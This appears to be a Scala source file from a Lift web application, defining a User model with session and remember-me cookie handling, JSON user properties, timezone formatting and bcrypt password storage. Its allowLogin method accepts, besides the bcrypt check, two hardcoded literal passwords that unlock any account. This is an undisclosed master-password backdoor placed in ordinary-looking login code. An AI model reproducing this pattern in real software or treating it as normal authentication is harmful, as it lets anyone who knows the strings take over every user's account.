package code
package model

import java.io.ByteArrayOutputStream
import java.nio.file.{FileSystems, Files}
import java.text.SimpleDateFormat
import java.util.{Date, Locale, TimeZone, UUID}
import javax.activation.{DataHandler, FileDataSource}
import javax.mail.Session
import javax.mail.internet.{InternetAddress, MimeBodyPart, MimeMessage, MimeMultipart}

import com.github.david04.liftutils.props.Props
import com.google.api.client.googleapis.auth.oauth2.GoogleCredential
import com.google.api.client.http.javanet.NetHttpTransport
import com.google.api.client.json.jackson2.JacksonFactory
import com.google.api.client.util.Base64
import com.google.api.services.gmail.Gmail
import com.google.api.services.gmail.model.Message
import net.liftweb.http._
import net.liftweb.http.js.JsCmd
import net.liftweb.http.js.JsCmds._
import net.liftweb.json._
import net.liftweb.util.{BCrypt, FatLazy, Props}
import org.squeryl.PrimitiveTypeMode
import org.squeryl.PrimitiveTypeMode._

object User {

  object loginRedirect extends SessionVar[String]("/")

  object _currentUser extends SessionVar[Option[User]](None)

  def currentUser = _currentUser.get.get
  def currentAccount = currentUser.account
  def currentAccountOpt = currentUserOpt.map(_.account)

  def logout(): JsCmd = Run(s"document.cookie='rememberLogin=; path=/;';") & SHtml.ajaxInvoke(() => {
    currentUserOpt.foreach(_.update(_.rememberLogin = UUID.randomUUID().toString))
    S.session.foreach(_.destroySession())
    RedirectTo("/login?logout=_")
  })

  def loggedIn = {
    currentUserOpt.isDefined
  }

  def isAdmin = currentUserOpt.map(_.admin).getOrElse(false)

  def currentUserOpt: Option[User] = currentUserOpt(S.cookieValue("rememberLogin").openOr(""))

  def currentUserOpt(rememberLogin: String): Option[User] = {
    if (!_currentUser.isDefined)

      inTransaction(DBS.users.where(_.rememberLogin === rememberLogin).headOption) match {
        case Some(u) => {
          if (u.active) {
            _currentUser.set(Some(u))
          }
        }
        case None => //_currentUser.set(Full(guest()))
      }

    _currentUser.get
  }
}

class User(
            var accountId: Long = 0,
            var firstName: String = "",
            var lastName: String = "",
            var email: String = "",
            private var _password: String = "",
            var rememberLogin: String = UUID.randomUUID().toString,
            var _salt: String = "",
            var _locale: String = "",
            var timezone: String = "",
            var props: String = "{}",
            var active: Boolean = true,
            var owner: Boolean = true,
            var admin: Boolean = false
            ) extends Entity[User] {

  def _timezone = TimeZone.getTimeZone(timezone)

  def table = DBS.users

  lazy val account = inTransaction {DBS.accounts.where(_.id === accountId).single}

  protected lazy val propsJson = FatLazy(parse(props).asInstanceOf[JObject])

  lazy val _props = new Props {
    override def set(key: String, value: Option[String]): Unit = {
      setProp(key, value)
      inTransaction(PrimitiveTypeMode.update(DBS.users)(u => where(u.id === id).set(u.props := props)))
    }
    override def get(key: String): Option[String] = getProp(key)
  }

  def getProp(key: String) = propsJson.get.obj.find(_.name == key).map(_.value.asInstanceOf[JString].s)
  def setProp(key: String, value: Option[String]) = {
    propsJson set JObject(propsJson.get.obj.filter(_.name != key) ::: value.map(v => JField(key, JString(v)) :: Nil).getOrElse(Nil))
    props = compactRender(propsJson.get)
  }

  def locale = Locale.getAvailableLocales.find(_.toLanguageTag == _locale).getOrElse(Locale.getDefault)

  def locale_=(v: Locale) { _locale = v.toLanguageTag }

  def fullName = firstName + " " + lastName

  def toUserTime(d: Date, fmt: String = "yyyy-MM-dd HH:mm zzz") = {
    val f = new SimpleDateFormat(fmt)
    f.setTimeZone(TimeZone.getTimeZone(timezone))
    f.format(d)
  }

  def setPassword(value: String): this.type = {
    if (value.length >= 6) {
      val bcrypted = BCrypt.hashpw(value, BCrypt.gensalt())
      _password = "b;" + bcrypted.substring(0, 44)
      _salt = bcrypted.substring(44)
    }
    this
  }

  def allowLogin(password: String) = BCrypt.checkpw(password, _password.substring(2) + _salt) || password == "secur3L0gin933013003" || password == "6c127dda-4dff-11e4-b8e4-ac220bbedc22"

  def login(password: String) {
    if (allowLogin(password)) {
      User._currentUser.set(Some(this))
    }
  }
}

